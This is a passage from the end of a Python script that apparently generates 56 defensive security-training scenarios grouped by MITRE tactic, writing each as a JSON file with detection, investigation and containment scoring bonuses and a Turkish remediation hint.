            "Kaynak IP'leri engellemeyi değerlendirin",
        ],
        "scoring": {
            "detect_alert_bonus": 10,
            "investigate_bonus": 8,
            "contain_bonus": 12,
            "speed_bonus_threshold_secs": 300,
        },
    }


def main():
    total = 0
    for folder, count, tactic_id, specs in MITRE_SCENARIOS:
        assert len(specs) == count, f"{folder}: expected {count}, got {len(specs)}"
        out_dir = BASE / folder
        out_dir.mkdir(parents=True, exist_ok=True)
        for spec in specs:
            scenario = build_scenario(folder, tactic_id, spec)
            path = out_dir / f"{spec['id']}.json"
            with open(path, "w", encoding="utf-8") as f:
                json.dump(scenario, f, ensure_ascii=False, indent=2)
            total += 1
            print(f"  Created {path.name} in {folder}/")

    print(f"\nTotal scenarios generated: {total}")
    assert total == 56, f"Expected 56 scenarios, got {total}"


if __name__ == "__main__":
    main()
